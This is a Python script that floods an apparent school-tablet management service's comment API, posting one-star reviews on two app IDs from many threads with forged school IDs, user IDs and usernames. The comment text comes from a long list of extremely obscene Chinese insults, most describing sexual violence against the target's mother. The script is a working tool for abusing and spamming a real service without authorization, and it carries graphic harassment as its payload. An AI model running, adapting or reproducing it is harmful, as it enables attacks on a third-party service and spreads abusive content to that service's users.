# coding=utf-8
import json
import time
import random
import requests
import string
import _thread as thread


def getRandChar(n):
    l = []
    sample = random.sample(string.ascii_letters + string.digits, 62)
    for i in range(n):
        char = random.choice(sample)
        l.append(char)
    return "".join(l)

counts = 0
serviceapi = "http://cloud.linspirer.com:8081/public-interface.php"
sb = [
    "Lenovo TB-X605F",
    "Lenovo TB-X605FC",
    "Lenovo TB-X505F",
    "Lenovo TB-X605M",
    "M2-A01w",
    "Lenovo TB3-850F",
    "Lenovo TB-8703F",
    "Lenovo TB-8X04F",
    "Lenovo TB-X505N",
    "Lenovo TB-X304N",
    "Lenovo YT-X705M",
    "Lenovo TB-8703R",
    "Lenovo TB-8504F",
    "HUAWEI M2-803L",
    "Lenovo TB-X606F",
    "Lenovo TB-X616F",
    "Lenovo TB-J606F",
    "Lenovo TB-X616M",
    "Lenovo TB-X306FC",
    "Leadpie P5",
    "G6",
    "XP11A",
    "XP11G",
    "H11",
    "H12",
    "HITV301C",
    "HITV512C",
    "SM-P583",
    "SM-P610",
    "rk3368-P9",
    "rk3368",
    "PAD-M7",
    "PAD-M7L",
    "HITV301C",
    "P550",
    "LS103I",
]

chaping = [
    "刚刚火葬场打电话过来，说妈粘锅了",
    "老子顶你个肺，塞你个胃，顶到你花开又富贵。",
    "东边不亮西边亮，憨批啥样你啥样",
    "你妈跟我分手了，哈哈，骗你的！愚人节快乐！你哪来的妈",
    "拜托你去整容啊，你妈怀孕的时候接客了吧，你被一根根鸡巴捅出个鸡巴样",
    "让你这傻逼包皮垢的大脑都吸收了大粪日积月累的精华，升级为傻逼包皮垢屎",
    "你这么高怎么不去打篮球？我回答:你这么矮怎么不去卖烧饼",
    "你好像那懒羊羊，三千多集顶坨翔你好像那美羊羊，三千多集找不到娘你好像那沸羊羊，三千多集当备胎你好像那灰太狼，三千多集总想凉你好像那暖羊羊，三千多集瘦不了你好像那喜羊羊，三千多集爸妈天上飘你好像那小灰灰，三千多集还是个弟弟",
    "用搅拌机把你妈的阴扩一下",
    "就这啊？大晚上的你~还没下班吗你和你爹坐店门口等你怎站街凯旋归来呢？你衫溃烂下身够不够你和你爹舔的啊？小学生词汇憋了半天就放出这么个屁啊我以为你是个野鸡女王家的大女儿没想到是个流脓臭批妈生的孤儿啊",
    "呵呵，你爸爸我当年真的好后悔没把你射墙上，导致你出来祸害14亿人民和祖国的花朵",
    "你妈东莞卖逼黑直肠烂子宫 生了你这么个梅毒三期红斑狼疮烂全身滥交操坏脑子艾滋没救的便宜女儿，脑子里装了多少阴沟里下三滥的龌龊思想被蛆蛀的天天意淫精神高潮",
    "此刻我化身为腕豪瑟提，一记W蓄力轰👊把你🐴打到高潮，然后W强手裂颅抓着你⌚️子🐴的奶子拉过来，之后接R叹为观止把你⌚️子🐴按在地上摩擦让你🐴尖叫连连淫水四射，最后开启Q屈人之威左勾拳右勾拳带走你🐴，让你🐴过上了去西天卖批的快乐日子",
    "你这傻🐶也就这么点出息了，骂人都要捡话，不愧是孤儿",
    "看你婊子妈在化粪池里游泳烂的跟你那鸡巴一样的脸差不多还在叫着自己怎么的烂逼是怎么被野狗咬烂的",
    "我喊十八个非洲猛男把你妈全身的洞插个遍,你妈还叫",
    "你妈逼是彩虹色的被各种男人的几把染的红橙黄绿青蓝紫，你妈逼就是个大染缸天天在妓院被操",
    "你话这么多怎么不坐你妈坟头慢慢说？",
    "今天不操你妈，你就不知道谁是你爸爸",
    "我要倒立和你妈来一炮才能解气",
    "你爹我用核弹轰击你妈子宫并产生巨大能量为城市发电",
    "我喂你吃屎的时候你还不忘留一点给你阴间的妈，属实孝子好感动啊👍",
    "阴间那团团绽放的烟花是宁被艹到炸裂的烂B？",
    "扣不过就去残疾人救助中心学习两年再出来好吗 乐死了",
    "天冷了告诉你妈多穿点别让你妈凉了",
    "去拼多多拼个妈再来和我说话",
    "你妈怀你的时候到底是甲醛吸多了还是农药喝多了",
    "你妈是你爹大吊里掏出来的大几把刚出世就会螺旋飞天转转的逼在空中灿烂盛放从逼里掏出来一个你浑身还沾着你妈的臭逼液你长大了要当太空人往你妈逼里塞了个大坟头真是母慈子孝你爸看了眼红急了把大吊塞进你妈坟头里你为了救你爸把头塞进你爸大吊里你们全家新年快乐",
    "沃日你屋头仙人没见过宁这么欠揍的，给宁脸了你爹都敢顶撞没见过你这么不孝的儿子草he tui老子没有你这个儿子，你他妈就不是人你这个吃屎的东西，骂你吃屎都是在夸你",
    "狗崽种，我给你🐴来两锤？开玩笑，我哪来的锤子你哪来的🐴？",
    "装你妈比 整天意淫自己拥有2CM的小鸡吧 还不赶快去粪池里处理一下你的大痔疮 不然射箭会射到脑子里的傻逼",
    "当时跟你爸生你的时候把你射墙上扣都扣不下来",
    "以前你🐴没染上梅毒性病的时候，老子天天日你🐴日的不要不要的。",
    "我也不言语，转身化身潘森，一记W定住你妈，Q穿你妈薄薄的处女膜。一记死亡E在你妈血逼里无限抽插。最后一记R直达你妈的子宫深处，打到高潮",
    "你的作为使得你妈无法呼吸明天的空气 你就是你妈的劫 ​​​",
    "你的赞比亚婊子妈昨天跪着求我强奸她被我拒绝，因为我曾亲眼看见你婊子妈在马路上同时被888条野狗抽插她的大烂逼，你妈说她爽到想要起飞，你那怂b短命爹在一旁边看边打飞机憋不住就射在狗屎上，狗屎条塞进你婊子妈的血盆大逼里十月怀胎生下你这个满嘴狗屎的狗头人身杂种。你他妈别恶心人了，我送你台三星note7,你赶紧塞你逼里爆炸送你上天，滚回你的赞比亚老家跟当地野狗-起疯狂繁衍后代",
    "我家小鲤鱼简直想在你妈臭嗨里历险。",
    "哦 Everybody在你🐴的批里面来个大闹天宫，I'm sorry我并不是你的野爹，你的样子像个废物、像个病毒任我玩弄，而你只会无能狂怒",
    "我很讨厌你 就像邻居吃了花椒，麻了隔壁",
    "老子用四川话骂你一-句听好 了:我把你妈日得好凶的唆? ?吼批麻了的你锤子吃多了的瓜麻批,爬求得远点哈你妈喊你批弯弯回去舔批了哈!一! 你妈的批被疯狗CAO烂了,你还不回去帮你妈舔一下? ? ?",
    "本来想和你妈妈散散步 没想到她先走一步",
    "看见你我就想起了我的狗。",
    "野儿子闻到了自己婊子妈子宫肌瘤的浓香终于按捺不住自己的劣根性开始疯狂意淫吃屎 你妈臭逼里被野爹做了扩阴手术成了香榭丽舍大道 现在正在上演车水马龙的卖逼哑剧呢，在月光的照耀下 你婊子妈阴道上所形成的沟壑依旧是那么出彩诱人 你废物爹终归在那晚识出了我就是当年嫖你瞎妈的蒙面神秘元凶啊~~~~~~",
    "骑在你的狗头上望着你婊子妈你婊子妈与我在你的狗脑袋上共度良宵可是你这废物只敢缩着脑袋说：我也想日啊",
    "你这个狗杂种还真是死皮赖脸 我在你亲妈嘴里拉了稀屎 看她气喘盱盱的样子就知道她吃的非常痛快",
    "和你这种臭傻卵互动真的恶心人 就你还瞧不起猪饲料 我寻思你不是从小吃到大的 你也配？",
    "俗语说淫贱者乐山，弱智者乐水，这句话的意思是你最喜欢在你淫贱公妈逶迤的甬道中徜徉翻滚，腾出阵阵细浪，好像滔滔江水连绵不绝，又有如黄河泛滥再来一发不可收拾。",
    "打南边来了个憨批，凑近一看，是个运动族谱",
    "以你爸的精子活力来看，你这个畜生能出生算奇迹",
    "你是不是喝你妈臭泔水长大的",
    "你这个贱人那么爱占便宜,假如拿人家的真手短的话,你他妈早就高位截瘫了!",
    "当初就该让我男朋友把你射在墙上，你个不孝子",
    "此刻我化身暗黑元首，一个黑暗法球炸断你母亲双手，一个驱使念力把你仓皇逃窜的母亲拉至胯下，再接着一个弱者退散让你母亲双腿大开如同鲲鹏展翅。最后一记能量倾泄带着六个暗黑法球在你母亲下体轰出一个线型虫洞，完成单杀！",
    "你🐴的逼是不是粘你脸上了？要不你怎么长了一副逼样儿。",
    "我拿着麦克风披着你🐴的鎏金镂空裹尸布站在你那因埃博拉与🐔瘟remix而死的婊子🐴棺材上连蹦带跳给你一顿暴扣",
    "你看看是我头像是不是和你妈b一样黑",
    "你的妈，母夜叉，半夜起来杀全家，你的爸，蜘蛛侠，飞檐走壁跳悬崖，你的爷，爱科学，老把破碗当飞碟，你的奶，卖牛奶，牛奶骚得没人买",
    "我去烧你妈骨灰玩然后拿你妈骨灰泡茶喝入口甘甜回味无穷喷喷香",
    "你妈买菜必涨价你爹在院子里种满枇杷祝你所有长辈  广场舞没c位祝你结婚彩礼超级加倍峡谷排亚索  吃鸡遇到卢本伟打赏的女主播全是坦克半夜起床工作 BUG越改越多祝你的甲方全是处女座祝你吃坏东西突然内急找不到厕所祝你在家下厨煮饭必糊炒菜必沾锅麻将从不会自摸    对面全是清一色每次拉稀总会不停的咳祝你斗地主每次拿3456没有7祝你大喜日子突然得知是买1送1公司开会放响屁",
]

def sendmessage(appid):
    global counts
    while 1:
        schoolid = str(
            getRandChar(8)
            + "-"
            + getRandChar(4)
            + "-"
            + getRandChar(4)
            + "-"
            + getRandChar(4)
            + "-"
            + getRandChar(12)
        ).lower()
        token = random.choice(sb)
        context = random.choice(chaping)
        userid = str(random.randint(1000000, 2000000))
        tag = random.randint(1, 4)
        username = getRandChar(random.randint(8, 16))
        client_version = (
            "4." + str(random.randint(1, 8)) + "." + str(random.randint(0, 9))
        )
        dataa = json.dumps(
            {
                "method": "com.linspirer.comment.addcomment",
                "id": "1",
                "!version": "1",
                "jsonrpc": "2.0",
                "params": {
                    "swdid": "4a",
                    "token": token,
                    "schoolid": schoolid,
                    "userid": userid,
                    "username": username,
                    "devicetype": 1,
                    "for": appid,
                    "context": context,
                    "star": 0,
                    "tag": tag,
                },
                "client_version": client_version,
                "_elapsed": 0,
            }
        )
        try:
            res = requests.post(url=serviceapi, data=dataa).text
            if json.loads(res).get("code") == 0:
                # print(str(appid)+" "+schoolid+" "+userid+" "+username+" "+context)
                counts += 1
        except:
            pass

app=[39088,21565]
threadcount=8
for appid in app:
    for i in range(threadcount):
        thread.start_new_thread(sendmessage,(appid,))
time.sleep(600)
print("totally sent "+str(counts))
exit(0)